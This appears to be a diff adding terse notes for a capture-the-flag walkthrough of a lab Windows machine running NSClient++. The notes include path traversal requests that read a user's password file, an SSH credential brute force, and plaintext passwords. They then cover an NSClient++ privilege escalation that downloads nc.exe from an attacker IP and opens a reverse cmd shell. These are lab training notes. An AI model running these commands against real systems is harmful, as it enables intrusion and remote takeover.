@@ -1,0 +1,49 @@
+//based on ippsec
+ftp 10.10.10.184
+anonymous:anonymous
+get Confidential.txt	//Notes to do.txt too
+http://10.10.10.184/Pages/login.htm
+GET /../../../../../../../../../../../../windows/win.ini
+//users: Nadine, Nathan
+GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txtp3ctTh3Way2Mars!
+
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 10.10.10.184
+set USER_FILE users.txt
+set PASS_FILE passwords.txt
+
+Nadine:L1k3B1gBut7s@W0rk
+
+C:\Program Files\NSClient++>type nsclient.ini
+//alternative
+cmd /c "c:\Program Files\NSClient++\nscp.exe" web -- password --display
+ew2x6SsGTxjRwXOT
+cmd /c "C:\Program Files\NSClient++\nscp.exe" --version
+
+ssh -L 8443:127.0.0.1:8443 Nadine@10.10.10.184
+Nadine:L1k3B1gBut7s@W0rk
+https://127.0.0.1:8443/index.html
+/settings/external scripts/scripts/Add a simple script
+
+searchsploit nsclient
+searchsploit -x json/webapps/48360.txt
+searchsploit -x windows/local/46802.txt
+
+echo 'ping -n 1 10.10.14.4' | iconv -t utf-16le | base64 -w 0
+tcpdump -i tun0 icmp
+
+Script:powershell.ps1
+Arguments:-EncodedCommand cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgA0AAoA
+
+section /whatever
+key command
+value c:\temp\whatever.bat
+
+echo powershell -enc cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgA0AAoA > whatever.bat
+script > command > save changes/reload > queries
+
+cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w 0
+curl 10.10.14.4:8000/nc.exe -o nc.exe
+nc -lvnp 9001
+echo c:\temp\nc.exe -e cmd 10.10.14.4 9001 > whatever.bat
+//run script from the web and got admin shell
